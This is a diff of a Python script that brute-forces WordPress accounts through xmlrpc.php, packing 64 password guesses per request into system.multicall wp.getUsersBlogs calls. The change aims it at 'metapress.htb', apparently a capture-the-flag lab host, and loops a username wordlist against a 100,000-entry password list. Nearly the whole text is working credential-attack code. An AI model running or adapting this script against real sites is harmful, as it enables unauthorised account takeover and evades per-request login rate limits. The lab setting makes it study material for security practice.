@@ -8,7 +8,9 @@ import requests
 output = open("./output.txt", "w")
 passwords = open(
     "/Users/bl4de/hacking/dictionaries/100000_passwords.txt").readlines()
-host = "HOST.com"
+usernames = open(
+    "/Users/bl4de/hacking/dictionaries/SecLists/Usernames/top-usernames-shortlist.txt").readlines()
+host = "metapress.htb"
 
 # headers used in POST requests
 h = {
@@ -19,7 +21,7 @@ h = {
 index = 0
 
 # XMLRPC url
-url = f"https://{host}/xmlrpc.php"
+url = "http://metapress.htb/xmlrpc.php"
 
 print("[+] building payload...")
 # building payload for system.multicall wp.getUsersBlogs
@@ -92,7 +94,7 @@ def send_request_with_username(username, passwords):
 
     payload = payload_start + payload + payload_end
 
-    print(payload)
+    # print(payload)
 
     print("[+] sending POST request with payload... ({} credentials in total checked)".format(total))
     resp = requests.post(url, headers=h, data=payload)
@@ -100,7 +102,7 @@ def send_request_with_username(username, passwords):
     if resp.status_code == 200:
         print("[+] response HTTP 200 OK received, analysing results...")
         # p0wned. This is the end :P
-        if "isAdmin" in resp.content:
+        if b"isAdmin" in resp.content:
             print("[+] SUCCESS !!! Matching username/password for {} found!, please review response content for details...").format(username)
             output.write(resp.content)
             exit(0)
@@ -117,11 +119,9 @@ def send_request_with_username(username, passwords):
         print(resp.content)
 
 
-# for username in usernames:
-#   send_request_with_username("trapcall", ["123456"])
-
-for i in range(0, 100000, 64):
-    p = passwords[i:i+64]
-    send_request_with_username("trapcall", p)
+for username in usernames:
+    for i in range(0, 100000, 64):
+        password = passwords[i:i+64]
+        send_request_with_username(username, password)
 
 print("[+] done...\n\n")
